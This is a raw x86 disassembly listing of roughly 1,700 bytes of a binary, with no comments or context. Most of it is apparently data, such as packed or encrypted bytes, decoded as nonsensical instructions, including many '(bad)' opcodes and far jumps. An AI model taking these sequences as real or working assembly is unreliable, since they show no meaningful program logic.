  415990:	xor    al,BYTE PTR [eax-0x76]
  415993:	inc    esp
  415994:	dec    esi
  415995:	fwait
  415996:	xor    ebp,edi
  415998:	mov    edx,0x75222032
  41599d:	sub    ebx,ebp
  41599f:	shl    DWORD PTR [esi],cl
  4159a1:	mov    eax,0x803a37ce
  4159a6:	or     ebp,edi
  4159a8:	jo     0x4159f4
  4159aa:	push   edx
  4159ab:	xchg   ebp,eax
  4159ac:	cmp    ah,ah
  4159ae:	jno    0x4159c5
  4159b0:	pop    eax
  4159b1:	call   0xf469:0xb71d4a40
  4159b8:	in     al,dx
  4159b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159ba:	inc    edx
  4159bb:	mov    ds:0xb2d6224c,eax
  4159c0:	das    
  4159c1:	out    dx,al
  4159c2:	and    ch,BYTE PTR [eax-0xc]
  4159c5:	xchg   ebx,eax
  4159c6:	shr    BYTE PTR [edi-0x4e3a432],0x15
  4159cd:	into   
  4159ce:	push   edx
  4159cf:	inc    esi
  4159d0:	jl     0x4159ba
  4159d2:	cs and ebx,eax
  4159d5:	iret   
  4159d6:	mov    eax,ds:0x74841c52
  4159db:	jae    0x4159ff
  4159dd:	pop    esp
  4159de:	jae    0x415a35
  4159e0:	and    DWORD PTR [esi-0x2a],esi
  4159e3:	push   esp
  4159e4:	ficom  WORD PTR [esi]
  4159e6:	xor    ah,ah
  4159e8:	sub    eax,DWORD PTR [edi+0x1742bb79]
  4159ee:	inc    eax
  4159ef:	xlat   BYTE PTR ds:[ebx]
  4159f0:	loopne 0x415991
  4159f2:	mov    al,ds:0x9795bc8
  4159f7:	test   eax,0xc336d71a
  4159fc:	js     0x4159bb
  4159fe:	ins    DWORD PTR es:[edi],dx
  4159ff:	push   es
  415a00:	cmp    edi,0x4a
  415a03:	xchg   edi,eax
  415a04:	ins    BYTE PTR es:[edi],dx
  415a05:	add    edx,edx
  415a07:	push   ebx
  415a08:	push   esi
  415a09:	mov    ecx,0xa3c542c9
  415a0e:	mov    BYTE PTR [ecx],al
  415a10:	jae    0x415a48
  415a12:	push   DWORD PTR [ebp+0x3af458cb]
  415a18:	mov    BYTE PTR [esi-0x6c],ah
  415a1b:	inc    ecx
  415a1c:	mov    bl,0xb2
  415a1e:	and    eax,0x8c6569f9
  415a23:	push   ss
  415a24:	and    eax,DWORD PTR [esi-0x3719f33a]
  415a2a:	add    ebp,DWORD PTR [esi-0x71]
  415a2d:	test   eax,0x363f6c8a
  415a32:	or     ebx,DWORD PTR [ecx-0x6f]
  415a35:	pop    esp
  415a36:	xchg   DWORD PTR ss:[esi+0xb],ebx
  415a3a:	add    BYTE PTR [edx+0x6d906b8d],dh
  415a40:	(bad)  
  415a41:	xor    BYTE PTR ds:0x411519f5,dl
  415a47:	js     0x4159e9
  415a49:	jg     0x415ab5
  415a4b:	imul   ebx,DWORD PTR [edx+0x6b881c7c],0x3e
  415a52:	cmp    BYTE PTR [edi-0x37],bl
  415a55:	in     eax,dx
  415a56:	stc    
  415a57:	cmpxchg DWORD PTR [edi-0x4fe2f33b],edx
  415a5e:	xchg   ecx,eax
  415a5f:	lea    esi,[ecx+0x33137759]
  415a65:	ds out dx,al
  415a67:	fwait
  415a68:	pushf  
  415a69:	pop    es
  415a6a:	inc    ecx
  415a6b:	fnstsw WORD PTR [ebx]
  415a6d:	pop    esi
  415a6e:	in     al,0x91
  415a70:	xchg   ebp,eax
  415a71:	mov    esi,0xae346239
  415a76:	loopne 0x415a4c
  415a78:	xchg   ebp,eax
  415a79:	or     ebp,edi
  415a7b:	sbb    DWORD PTR [esi-0x11320a65],esi
  415a81:	add    ecx,esi
  415a83:	jne    0x4136c2
  415a89:	mov    ecx,DWORD PTR [ebp-0x20]
  415a8c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  415a93:	mov    dl,BYTE PTR [ebp-0x1]
  415a96:	cmp    cl,dl
  415a98:	je     0x420d32
  415a9e:	jmp    0x417e2b
  415aa3:	jb     0x415a63
  415aa5:	or     eax,0x7679f979
  415aaa:	mov    eax,ds:0xde6af8ab
  415aaf:	mov    esi,0x4e8bfa43
  415ab4:	push   edi
  415ab5:	jge    0x415b31
  415ab7:	or     bl,BYTE PTR [edi+0x7a]
  415aba:	jp     0x415a4f
  415abc:	dec    esp
  415abd:	call   0x77d2:0xbe35db7d
  415ac4:	sub    DWORD PTR ds:0xbe8760ba,eax
  415aca:	mov    edi,0x175014de
  415acf:	cmp    ebp,DWORD PTR [ecx+edi*8+0x550cc3d0]
  415ad6:	jmp    0x415a88
  415ad8:	sahf   
  415ad9:	outs   dx,BYTE PTR ds:[esi]
  415ada:	mov    edi,0xa54957e9
  415adf:	call   0x8b87:0xf679073a
  415ae6:	jae    0x415b07
  415ae8:	(bad)  
  415ae9:	scas   al,BYTE PTR es:[edi]
  415aea:	jl     0x415ae3
  415aec:	pushf  
  415aed:	cmp    BYTE PTR [esi+ebp*4+0x2b],bh
  415af1:	outs   dx,BYTE PTR ds:[esi]
  415af2:	cmp    ah,BYTE PTR [edi]
  415af4:	push   cs
  415af5:	jle    0x415b05
  415af7:	sub    al,0x4d
  415af9:	jmp    0x5f50e816
  415afe:	daa    
  415aff:	mov    bh,0x21
  415b01:	pop    esp
  415b02:	mov    ss:0xd6ba061c,al
  415b08:	mov    eax,?
  415b0a:	fisttp DWORD PTR [eax+0x47]
  415b0d:	mov    WORD PTR [ebx+ecx*2+0x61],ds
  415b11:	cwde   
  415b12:	ins    DWORD PTR es:[edi],dx
  415b13:	inc    eax
  415b14:	fidiv  WORD PTR [ebx+ecx*2+0x36]
  415b18:	cmp    bl,dl
  415b1a:	mov    bl,BYTE PTR [ebx+0x30ed1787]
  415b20:	aam    0xac
  415b22:	mov    ecx,0xaa89974
  415b27:	ins    DWORD PTR es:[edi],dx
  415b28:	pop    esp
  415b29:	inc    eax
  415b2a:	and    eax,DWORD PTR [edi-0x49476829]
  415b30:	adc    DWORD PTR [edi],eax
  415b32:	fcmovnu st,st(3)
  415b34:	push   ds
  415b35:	mov    WORD PTR [eax+eax*8+0x8],?
  415b39:	rol    BYTE PTR [ecx-0x32],cl
  415b3c:	test   eax,0xb030acd0
  415b41:	lods   al,BYTE PTR ds:[esi]
  415b42:	ins    DWORD PTR es:[edi],dx
  415b43:	adc    al,0x52
  415b45:	cmp    eax,0x73a1b497
  415b4a:	xchg   edx,eax
  415b4b:	faddp  st(1),st
  415b4d:	and    ecx,eax
  415b4f:	dec    esi
  415b50:	popa   
  415b51:	outs   dx,BYTE PTR ds:[esi]
  415b52:	and    DWORD PTR [edx-0x5],edx
  415b55:	retf   
  415b56:	adc    esp,DWORD PTR [edi-0x89cdcf]
  415b5c:	rol    eax,cl
  415b5e:	xor    eax,0xe5416d23
  415b63:	cdq    
  415b64:	inc    eax
  415b65:	aam    0x6f
  415b67:	sbb    eax,0x8d36f074
  415b6c:	push   edi
  415b6d:	loopne 0x415b8a
  415b6f:	xor    edi,DWORD PTR [esi+0x21]
  415b72:	(bad)  
  415b73:	call   0x9c7f476
  415b78:	push   0xffffff8a
  415b7a:	fild   DWORD PTR [ebx]
  415b7c:	out    0xbd,al
  415b7e:	or     ebx,DWORD PTR [eax+0x34]
  415b81:	lods   al,BYTE PTR ds:[esi]
  415b82:	mov    BYTE PTR [eax],dl
  415b84:	push   ebx
  415b85:	add    BYTE PTR [ecx-0xc0e8d6],bh
  415b8b:	push   0xc38ea6b6
  415b90:	aaa    
  415b91:	jmp    0x1bf0:0xaf432900
  415b98:	jecxz  0x415b81
  415b9a:	jns    0x415b7d
  415b9c:	hlt    
  415b9d:	push   0xffffffd1
  415b9f:	push   ebx
  415ba0:	dec    eax
  415ba1:	push   eax
  415ba2:	addr16 dec edi
  415ba4:	push   esi
  415ba5:	dec    ebx
  415ba6:	test   ecx,0x7d1d2134
  415bac:	mov    eax,0xab6ca305
  415bb1:	sub    eax,0x9f9e3618
  415bb6:	mov    dl,0xe6
  415bb8:	add    ebp,DWORD PTR [esi+edi*4-0x6e]
  415bbc:	inc    edx
  415bbd:	inc    eax
  415bbe:	(bad)  
  415bbf:	fmul   DWORD PTR [edi+eax*8-0x76]
  415bc3:	js     0x415c31
  415bc5:	fist   DWORD PTR [ebx+0x28]
  415bc8:	push   es
  415bc9:	leave  
  415bca:	jne    0x415b69
  415bcc:	sahf   
  415bcd:	sub    edx,DWORD PTR [ecx-0x65]
  415bd0:	neg    BYTE PTR [edx]
  415bd2:	cdq    
  415bd3:	mov    edx,0x10c8e06a
  415bd8:	cld    
  415bd9:	retf   
  415bda:	pop    eax
  415bdb:	xor    edi,DWORD PTR [esi]
  415bdd:	das    
  415bde:	inc    esp
  415bdf:	inc    edx
  415be0:	enter  0x7943,0xba
  415be4:	inc    esp
  415be5:	popa   
  415be6:	mov    ebx,0x7d9651dc
  415beb:	pusha  
  415bec:	les    eax,FWORD PTR cs:[esi-0x21]
  415bf0:	out    dx,al
  415bf1:	add    al,0xff
  415bf3:	pop    edi
  415bf4:	push   ebp
  415bf5:	sub    BYTE PTR [eax+0x53],al
  415bf8:	or     dl,BYTE PTR [ebx]
  415bfa:	stc    
  415bfb:	cmp    eax,0x7996511b
  415c00:	rcr    BYTE PTR [esi],1
  415c02:	loopne 0x415ba7
  415c04:	fs inc ecx
  415c06:	sbb    ax,0xa254
  415c0a:	fadd   st(6),st
  415c0c:	xchg   esp,eax
  415c0d:	into   
  415c0e:	and    eax,0x51af0e58
  415c13:	push   edx
  415c14:	pop    esp
  415c15:	xchg   bl,dh
  415c17:	and    BYTE PTR [edi+0x4eb289ad],bl
  415c1d:	lea    ecx,[esi-0x3]
  415c20:	pop    esi
  415c21:	in     al,0xaa
  415c23:	cld    
  415c24:	push   edi
  415c25:	nop
  415c26:	aam    0xe1
  415c28:	mov    ah,0x9e
  415c2a:	rep ins DWORD PTR es:[edi],dx
  415c2c:	inc    ebp
  415c2d:	or     ah,ch
  415c2f:	out    0x8,eax
  415c31:	or     cl,BYTE PTR [edx]
  415c33:	out    0x1e,eax
  415c35:	xchg   esi,eax
  415c36:	stos   DWORD PTR es:[edi],eax
  415c37:	leave  
  415c38:	mov    dh,0x34
  415c3a:	xor    DWORD PTR [esi+0x71],ebp
  415c3d:	sub    DWORD PTR [eax],0x44009c92
  415c43:	(bad)  
  415c44:	gs jecxz 0x415c8a
  415c47:	outs   dx,BYTE PTR ds:[esi]
  415c48:	popa   
  415c49:	fdivr  QWORD PTR [ebp+ecx*4+0x8044f23]
  415c50:	dec    esi
  415c51:	xchg   ecx,eax
  415c52:	daa    
  415c53:	icebp  
  415c54:	icebp  
  415c55:	dec    ebp
  415c56:	mov    ebp,0x6dc81ff
  415c5b:	inc    edi
  415c5c:	lahf   
  415c5d:	inc    esp
  415c5e:	xchg   DWORD PTR [ebp+0x61],edi
  415c61:	push   esi
  415c62:	xor    eax,0xefb48dcf
  415c67:	mov    BYTE PTR [ebx*2+0x2a314f1e],bl
  415c6e:	cmp    eax,0x3a0fbad3
  415c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c74:	fdiv   st(7),st
  415c76:	fnstsw WORD PTR [ecx+0x2c2e6817]
  415c7c:	dec    esi
  415c7d:	mov    al,ds:0xe4cb178c
  415c82:	outs   dx,BYTE PTR ds:[esi]
  415c83:	int3   
  415c84:	inc    edx
  415c85:	in     al,0xa5
  415c87:	sub    eax,0x8e08b67a
  415c8c:	in     eax,dx
  415c8d:	gs dec edi
  415c8f:	mov    DWORD PTR [ecx+0x763158ba],ebx
  415c95:	stos   BYTE PTR es:[edi],al
  415c96:	xchg   ecx,eax
  415c97:	cmp    DWORD PTR [esi-0x5c2791f],ebp
  415c9d:	cmp    al,BYTE PTR [ebp-0x3f]
  415ca0:	or     esp,DWORD PTR [ecx]
  415ca2:	push   ds
  415ca3:	test   DWORD PTR [edx],esp
  415ca5:	arpl   dx,di
  415ca7:	dec    edi
  415ca8:	mov    ebx,0xfc4dee3d
  415cad:	inc    esi
  415cae:	dec    esp
  415caf:	or     esp,0x8edc188c
  415cb5:	(bad)  
  415cb6:	mov    fs,WORD PTR [ebx+ebp*2]
  415cb9:	daa    
  415cba:	lahf   
  415cbb:	leave  
  415cbc:	lds    ecx,FWORD PTR [ebp*4+0x2e7319ed]
  415cc3:	cld    
  415cc4:	cld    
  415cc5:	push   edx
  415cc6:	cmp    BYTE PTR [edi-0x38c804d7],bl
  415ccc:	xchg   edx,eax
  415ccd:	mov    ch,0xbc
  415ccf:	push   esi
  415cd0:	add    BYTE PTR [ebp-0x2be7939f],ah
  415cd6:	inc    BYTE PTR [edx]
  415cd8:	jge    0x415c5c
  415cda:	jmp    0x1732:0xd9eea295
  415ce1:	add    bh,BYTE PTR [ebp+0x39]
  415ce4:	stos   DWORD PTR es:[edi],eax
  415ce5:	(bad)  
  415ce6:	iret   
  415ce7:	sub    BYTE PTR [edx+0x39a107e5],0x98
  415cee:	pop    ss
  415cef:	int    0x7
  415cf1:	inc    ebx
  415cf2:	int3   
  415cf3:	es and al,0x90
  415cf6:	mov    cl,BYTE PTR [eax+0x23a0b2cd]
  415cfc:	and    al,0x77
  415cfe:	cmp    BYTE PTR [ebp+0x31e186df],bl
  415d04:	jnp    0x415c9e
  415d06:	sub    al,0x54
  415d08:	push   ss
  415d09:	mul    BYTE PTR [ebx]
  415d0b:	adc    bh,BYTE PTR [ebx-0x27]
  415d0e:	jnp    0x415d1a
  415d10:	jp     0x415d91
  415d12:	cmc    
  415d13:	mov    eax,0x3c54f34e
  415d18:	jae    0x415d01
  415d1a:	(bad)  [ebp+0x5d61cf8d]
  415d20:	mov    ds:0x2617c912,eax
  415d25:	and    edi,DWORD PTR [edx+eax*4-0x3a]
  415d29:	push   esi
  415d2a:	cs in  al,dx
  415d2c:	fnstenv [edi-0x67]
  415d2f:	sub    dh,BYTE PTR [esi+0x51dd475a]
  415d35:	add    DWORD PTR [eax],esi
  415d37:	inc    eax
  415d38:	(bad)
  415d3b:	shl    DWORD PTR [esi+0x5dc53d7b],1
  415d41:	bound  ebx,QWORD PTR ds:0xf96a0a5b
  415d47:	mov    ecx,0x14ad8916
  415d4c:	push   es
  415d4d:	push   cs
  415d4e:	dec    ecx
  415d4f:	xchg   ecx,eax
  415d50:	push   esi
  415d51:	outs   dx,BYTE PTR ds:[esi]
  415d52:	and    edi,DWORD PTR [ebx-0x28]
  415d55:	sub    DWORD PTR [esi+0x1b5224a6],esi
  415d5b:	mov    ch,0xa0
  415d5d:	in     eax,0x3e
  415d5f:	push   dx
  415d61:	and    al,0x17
  415d63:	in     al,dx
  415d64:	mov    ebp,0xd9937b9
  415d69:	test   cl,al
  415d6b:	std    
  415d6c:	ss push ebp
  415d6e:	xor    eax,DWORD PTR [ebp+0xe]
  415d71:	xlat   BYTE PTR ds:[ebx]
  415d72:	mov    ds:0x152e2ace,eax
  415d77:	push   cs
  415d78:	mov    WORD PTR [edx-0x7f],?
  415d7b:	mov    eax,edx
  415d7d:	add    cl,BYTE PTR [edx+ecx*8]
  415d80:	stos   BYTE PTR es:[edi],al
  415d81:	push   0xa8d8435c
  415d86:	(bad)  
  415d88:	js     0x415dac
  415d8a:	outs   dx,DWORD PTR ds:[esi]
  415d8b:	jg     0x415d20
  415d8d:	loopne 0x415df6
  415d8f:	fidiv  DWORD PTR [eax]
  415d91:	iret   
  415d92:	and    al,0xbd
  415d94:	stc    
  415d95:	test   DWORD PTR [ecx+0x55d05e05],edx
  415d9b:	xor    bl,al
  415d9d:	xor    al,0xe9
  415d9f:	dec    edi
  415da0:	mov    eax,0xab718afb
  415da5:	mov    ebx,0x6766d396
  415daa:	push   ecx
  415dab:	ficom  WORD PTR [edx+0x50]
  415dae:	fadd   DWORD PTR [esi]
  415db0:	es push esi
  415db2:	jbe    0x415e0a
  415db4:	jb     0x415dde
  415db6:	mov    dl,0x94
  415db8:	test   esi,edx
  415dba:	jns    0x415d7a
  415dbc:	int3   
  415dbd:	(bad)  
  415dbe:	dec    ebx
  415dbf:	std    
  415dc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dc1:	add    edx,ebp
  415dc3:	pop    edi
  415dc4:	fist   DWORD PTR [ebx+edi*1]
  415dc7:	imul   ch
  415dc9:	mov    DWORD PTR [ebx+0x53],ebp
  415dcc:	rcr    BYTE PTR [ebx-0x7b],1
  415dcf:	shl    ecx,1
  415dd1:	hlt    
  415dd2:	inc    ebx
  415dd3:	outs   dx,DWORD PTR ds:[esi]
  415dd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dd5:	aas    
  415dd6:	sar    DWORD PTR [edi],cl
  415dd8:	sbb    edx,DWORD PTR [edi+0x6c]
  415ddb:	shr    BYTE PTR [ebx],1
  415ddd:	fmul   st(5),st
  415ddf:	shl    ebp,cl
  415de1:	mov    ecx,0x69876ef
  415de6:	mov    ch,0x2c
  415de8:	inc    edx
  415de9:	xchg   ch,bh
  415deb:	bound  eax,QWORD PTR [edx-0x1a9bac24]
  415df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415df2:	hlt    
  415df3:	std    
  415df4:	lods   eax,DWORD PTR ds:[esi]
  415df5:	adc    DWORD PTR [eax],ebx
  415df7:	loope  0x415d83
  415df9:	enter  0x1606,0xb3
  415dfd:	push   0x65ab341e
  415e02:	or     dl,BYTE PTR cs:[edx]
  415e05:	push   esp
  415e06:	stc    
  415e07:	daa    
  415e08:	mov    eax,ds:0x5dfb9e69
  415e0d:	dec    esp
  415e0e:	shl    DWORD PTR [ebp+0x52],1
  415e11:	into   
  415e12:	popa   
  415e13:	leave  
  415e14:	shl    DWORD PTR [edx],0x5a
  415e17:	push   0x8a63a319
  415e1c:	push   edi
  415e1d:	xchg   edi,eax
  415e1e:	popf   
  415e1f:	lock daa 
  415e21:	fisttp QWORD PTR [edi+0x4f]
  415e24:	in     al,0xe6
  415e26:	mov    esi,0x4cccbe09
  415e2b:	gs xchg edi,eax
  415e2d:	jnp    0x415de2
  415e2f:	sbb    al,0x21
  415e31:	cmp    al,0x13
  415e33:	fistp  QWORD PTR [edx-0x80]
  415e36:	mov    esp,0x775feff0
  415e3b:	dec    ebx
  415e3c:	mov    dl,0xfe
  415e3e:	xchg   ebp,eax
  415e3f:	outs   dx,DWORD PTR ds:[esi]
  415e40:	add    edx,DWORD PTR [esi-0x9]
  415e43:	mov    ah,0x19
  415e45:	mov    dl,0x4e
  415e47:	xchg   BYTE PTR [edi+0x1c],ah
  415e4a:	add    esi,DWORD PTR [ecx]
  415e4c:	cmp    dh,BYTE PTR [edi+0x29f75661]
  415e52:	ins    BYTE PTR es:[edi],dx
  415e53:	push   esi
  415e54:	or     DWORD PTR ss:[esi],eax
  415e57:	push   eax
  415e58:	stc    
  415e59:	lock into 
  415e5b:	sbb    bh,BYTE PTR [eax-0x7039bc92]
  415e61:	mov    dl,0x2c
  415e63:	leave  
  415e64:	sar    DWORD PTR [edi],0xb1
  415e67:	clc    
  415e68:	xchg   edx,eax
  415e69:	sbb    eax,DWORD PTR [esi+0x21]
  415e6c:	fs (bad) 
  415e6e:	aad    0xa0
  415e70:	jg     0x415e3d
  415e72:	adc    BYTE PTR [ecx],dh
  415e74:	mov    ah,0xb9
  415e76:	fcomp  DWORD PTR [ecx]
  415e78:	mov    al,0xe
  415e7a:	add    esp,DWORD PTR [ecx+0x3dc2eeb2]
  415e80:	popf   
  415e81:	xor    eax,DWORD PTR [ecx+eiz*2-0x471042ed]
  415e88:	(bad)
  415e8c:	pop    edx
  415e8d:	pop    ecx
  415e8e:	ins    BYTE PTR es:[edi],dx
  415e8f:	into   
  415e90:	adc    BYTE PTR [eax+0x65],dh
  415e93:	inc    eax
  415e94:	fimul  WORD PTR cs:[esi-0x80]
  415e98:	xchg   edi,eax
  415e99:	and    eax,0x2cc07475
  415e9e:	out    0xca,eax
  415ea0:	or     BYTE PTR [esi],al
  415ea2:	jne    0x415e32
  415ea4:	(bad)  
  415ea5:	push   edi
  415ea6:	add    al,0xb6
  415ea8:	inc    esp
  415ea9:	adc    DWORD PTR ss:[eax],edx
  415eac:	fidivr DWORD PTR [edx]
  415eae:	xlat   BYTE PTR ds:[ebx]
  415eaf:	sub    dh,bl
  415eb1:	inc    ebx
  415eb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eb3:	mov    ebp,DWORD PTR [eax-0x38]
  415eb6:	ret    
  415eb7:	xchg   ebx,eax
  415eb8:	adc    edi,edi
  415eba:	cmp    al,BYTE PTR [edi-0x28]
  415ebd:	retf   0x4a32
  415ec0:	cmc    
  415ec1:	xlat   BYTE PTR ds:[ebx]
  415ec2:	cmp    cl,cl
  415ec4:	and    BYTE PTR [edx],0xd0
  415ec7:	jle    0x415e5d
  415ec9:	fsub   QWORD PTR [eax+0x5875b4a6]
  415ecf:	les    esi,FWORD PTR [edi*2-0x79f2047c]
  415ed6:	inc    edi
  415ed7:	mov    ebp,0x62a9bd21
  415edc:	nop
  415edd:	mov    dh,0x8d
  415edf:	lea    edi,[edx+0x7f]
  415ee2:	(bad)  
  415ee3:	dec    ebp
  415ee4:	cli    
  415ee5:	mov    ds:0x1a3cb1fb,eax
  415eea:	inc    edx
  415eeb:	jnp    0x415ee5
  415eed:	push   ds
  415eee:	inc    eax
  415eef:	fist   DWORD PTR [edx]
  415ef1:	adc    ebp,DWORD PTR [edi+ecx*1+0x1adf370e]
  415ef8:	(bad)  
  415ef9:	ins    BYTE PTR es:[edi],dx
  415efa:	xor    ecx,eax
  415efc:	mov    bl,0xa2
  415efe:	inc    ebp
  415eff:	fild   QWORD PTR [ebx-0x5bb3fb4e]
  415f05:	adc    BYTE PTR [edx+eiz*2],dl
  415f08:	add    al,0xb2
  415f0a:	adc    bh,BYTE PTR [ebx+eiz*8]
  415f0d:	jns    0x415f25
  415f0f:	int3   
  415f10:	jns    0x415f8a
  415f12:	shl    DWORD PTR [edi+esi*4+0xb4be6a4],cl
  415f19:	pusha  
  415f1a:	sbb    esp,DWORD PTR [edi+0x23]
  415f1d:	push   esp
  415f1e:	fld    TBYTE PTR [eax+0x44]
  415f21:	sub    ah,BYTE PTR [ebp+0x27]
  415f24:	int    0xb4
  415f26:	mov    ebp,0x24ca96f9
  415f2b:	mov    ebp,0xa0217a06
  415f30:	outs   dx,BYTE PTR ds:[esi]
  415f31:	test   al,0x17
  415f33:	outs   dx,BYTE PTR ds:[esi]
  415f34:	cld    
  415f35:	mov    dl,0xe0
  415f37:	mov    al,0x25
  415f39:	mov    esp,esp
  415f3b:	mov    bl,0xf6
  415f3d:	mov    ecx,0x31d495db
  415f42:	fisub  WORD PTR [edi-0x2a]
  415f45:	add    al,0xb2
  415f47:	pop    es
  415f48:	add    eax,0xfaab4b16
  415f4d:	fadd   QWORD PTR [eax-0x34]
  415f50:	inc    edi
  415f51:	add    eax,0xf87573ef
  415f56:	leave  
  415f57:	das    
  415f58:	inc    esi
  415f59:	xchg   edi,eax
  415f5a:	jl     0x415ef2
  415f5c:	mov    BYTE PTR [eax+0x48],ah
  415f5f:	mov    ecx,0x265f18b4
  415f64:	or     BYTE PTR [eax-0x8],ch
  415f67:	test   eax,0xc30f6d39
  415f6c:	jo     0x415f09
  415f6e:	test   al,0x24
  415f70:	pop    edx
  415f71:	jmp    DWORD PTR [edi+0x5421daba]
  415f77:	adc    DWORD PTR [edx-0x57ed62e2],eax
  415f7d:	fidivr WORD PTR gs:0xbcc9bc54
  415f84:	outs   dx,DWORD PTR ds:[esi]
  415f85:	and    eax,0xd67e249a
  415f8a:	je     0x415fd0
  415f8c:	lods   eax,DWORD PTR ds:[esi]
  415f8d:	rcr    DWORD PTR [edx-0x23],0xf2
  415f91:	es add eax,0x5e7c64ea
  415f97:	mov    edi,0x821a019f
  415f9c:	sub    DWORD PTR [esi],edi
  415f9e:	and    BYTE PTR [ecx+0x71907d1b],cl
  415fa4:	or     ebx,ebx
  415fa6:	call   0xcbb818be
  415fab:	in     eax,dx
  415fac:	xchg   dl,dl
  415fae:	sbb    eax,0xc69ee3bc
  415fb3:	ins    BYTE PTR es:[edi],dx
  415fb4:	lock cmp al,0x6b
  415fb7:	adc    ecx,DWORD PTR ds:0x4c2ae82
  415fbd:	jae    0x415f93
  415fbf:	push   0xffffffff
  415fc1:	and    al,0xb3
  415fc3:	mov    al,0xc3
  415fc5:	add    edx,esi
  415fc7:	dec    esp
  415fc8:	mov    ebp,0x574b80f3
  415fcd:	lds    ebx,FWORD PTR [esi+0xdb4fa26]
  415fd3:	sub    bl,BYTE PTR [edi+0x1068dace]
  415fd9:	mov    ch,0x9f
  415fdb:	mov    ch,0x6a
  415fdd:	(bad)  [eax-0x7553aa3f]
  415fe3:	adc    ah,BYTE PTR [ebx-0x72]
  415fe6:	or     BYTE PTR [eax-0x1b216e4a],0xf9
  415fed:	mov    esi,0x870c0a37
  415ff2:	push   ds
  415ff3:	repz inc edi
  415ff5:	adc    DWORD PTR es:[ebx],0x67
  415ff9:	loope  0x416069
  415ffb:	es add ch,dh
  415ffe:	pusha  
  415fff:	dec    ecx
  416000:	retf   0xf040
  416003:	add    DWORD PTR [esi+0x46],edi
  416006:	imul   edx,ebx,0x6
  416009:	daa    
  41600a:	pop    edx
  41600b:	fucom  st(4)
  41600d:	xchg   cx,ax
  41600f:	xor    al,0xbf
  416011:	sbb    al,0x61
  416013:	inc    esi
  416014:	push   esp
  416015:	mov    bh,dl
  416017:	jecxz  0x416010
  416019:	jge    0x416076
  41601b:	sti    
  41601c:	ss push 0x46
  41601f:	sub    al,0x44
  416021:	xchg   ebx,eax
  416022:	pop    ds
  416023:	lods   eax,DWORD PTR ds:[esi]
  416024:	xor    ebp,DWORD PTR [ebx]
  416026:	fidivr DWORD PTR [ebp-0x3f603619]
  41602c:	mov    al,ds:0xe7431b3a
  416031:	sbb    eax,0x2354a322
  416036:	idiv   DWORD PTR [edx-0x26]
  416039:	idiv   DWORD PTR [esi]
  41603b:	out    0xae,al
  41603d:	xchg   edi,eax
  41603e:	cmp    DWORD PTR [ebx+0x2bfc1f49],ebx
  416044:	adc    eax,0x32f52c09
  416049:	pop    esi
  41604a:	dec    ebp
  41604b:	mov    bl,0xcc
  41604d:	mov    bl,0x76
  41604f:	dec    edi
  416050:	jns    0x415ffa
  416052:	retf   
  416053:	loop   0x416032
  416055:	popa   
  416056:	jg     0x41601b
  416058:	mov    esp,0xcf289a8d
  41605d:	pop    ebx
  41605e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41605f:	std    
  416060:	sbb    bh,dh
  416062:	or     eax,0x3ff39e98
  416067:	dec    edx
  416068:	stos   BYTE PTR es:[edi],al
  416069:	cld    
  41606a:	jnp    0x415ff4
  41606c:	mov    bh,0xab
  41606e:	iret   
  41606f:	and    dh,BYTE PTR [ecx-0x5aa42cfb]
  416075:	xchg   ebx,eax
  416076:	cmp    al,BYTE PTR [edi+0x1095f025]
  41607c:	ins    DWORD PTR es:[edi],dx
  41607d:	daa    
  41607e:	push   edi
  41607f:	mov    bh,0x49
  416081:	ins    DWORD PTR es:[edi],dx
  416082:	(bad)  
  416084:	sbb    ah,ah
  416086:	out    0xeb,eax
  416088:	mov    esi,esi
  41608a:	outs   dx,DWORD PTR ds:[esi]
  41608b:	inc    esi
  41608c:	adc    DWORD PTR [ebx],edx
  41608e:	dec    ebp
  41608f:	ret    0x6944
  416092:	nop
  416093:	push   0xffffffff
  416095:	or     esi,0x73
  416098:	sbb    eax,0xb87225cd
  41609d:	mul    ah
  41609f:	cmp    BYTE PTR [eax-0x3],dh
  4160a2:	or     DWORD PTR [ecx-0x367f0667],edx
  4160a8:	adc    DWORD PTR [eax+0x56],edi
  4160ab:	inc    ecx
  4160ac:	sbb    DWORD PTR [edx-0x40045e93],0x3d
  4160b3:	cmp    eax,0xc30abe80
  4160b8:	dec    ecx
  4160b9:	ss push edi
  4160bb:	push   ecx
  4160bc:	dec    ebp
  4160bd:	lock ret 
  4160bf:	neg    DWORD PTR [ebx-0x47]
  4160c2:	loopne 0x416087
  4160c4:	ds push edi
  4160c6:	ins    BYTE PTR es:[edi],dx
  4160c7:	jb     0x41612f
  4160c9:	pop    es
  4160ca:	gs loop 0x416067
  4160cd:	dec    edx
  4160ce:	fidiv  WORD PTR [ebx+ebx*8+0x3a1b41b0]
  4160d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160d6:	sbb    eax,0x27e029a0
  4160db:	add    DWORD PTR [ebp-0x46],ecx
  4160de:	pop    ebp
  4160df:	sbb    al,0x6b
  4160e1:	call   DWORD PTR [ecx-0x15f45523]
  4160e7:	call   0x44e7:0x483c701b
  4160ee:	dec    ecx
  4160ef:	std    
  4160f0:	aam    0x8d
  4160f2:	or     BYTE PTR [ebx-0x27f545b3],cl
  4160f8:	in     al,0xbf
  4160fa:	cmp    ecx,ebx
  4160fc:	adc    eax,0x60f79753
  416101:	push   esp
  416102:	mov    eax,0x76d8f746
  416107:	or     dl,BYTE PTR [esi]
  416109:	out    dx,al
  41610a:	lahf   
  41610b:	arpl   WORD PTR [ebp-0x55ee40ad],bx
  416111:	gs cld 
  416113:	sub    BYTE PTR [esi-0x12],0xe
  416117:	loopne 0x4160ef
  416119:	fs dec ebp
  41611b:	push   ebx
  41611c:	fwait
  41611d:	jle    0x4160b1
  41611f:	jno    0x4160d8
  416121:	stos   BYTE PTR es:[edi],al
  416122:	cmp    al,BYTE PTR [edi]
  416124:	popa   
  416125:	push   0x915fe9c4
  41612a:	mov    ch,0x9c
  41612c:	mov    BYTE PTR ds:0x4619b2d3,bl
  416132:	push   0xffffff97
  416134:	push   edi
  416135:	inc    edx
  416136:	enter  0x8d37,0xf
  41613a:	repnz test al,0x6
  41613d:	inc    ebx
